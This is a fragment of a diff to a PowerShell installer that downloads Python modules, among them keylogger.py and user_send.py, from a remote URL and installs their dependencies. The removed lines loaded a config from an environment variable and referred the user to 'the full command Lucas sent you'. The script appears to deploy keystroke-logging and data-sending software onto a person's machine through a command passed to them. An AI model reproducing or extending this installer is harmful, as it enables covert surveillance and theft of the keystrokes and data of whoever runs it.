@@ -16,11 +16,6 @@ foreach ($f in "keylogger.py","survey.py","user_send.py","updater.py","app_paths
     Invoke-WebRequest "$raw/$f" -OutFile (Join-Path $dir $f) -UseBasicParsing
 }
 
-$cfg = Join-Path $dir "config.json"
-if ($env:TS_CONFIG) { [IO.File]::WriteAllBytes($cfg, [Convert]::FromBase64String($env:TS_CONFIG)) }
-elseif (Test-Path .\config.json) { Copy-Item .\config.json $cfg -Force }
-if (-not (Test-Path $cfg)) { throw "No config. Use the full command Lucas sent you (it sets TS_CONFIG)." }
-
 python -m pip install --upgrade pip --quiet
 python -m pip install -r (Join-Path $dir "requirements.txt") --quiet
 if ($LASTEXITCODE -ne 0) { throw "Dependency install failed - nothing was registered." }
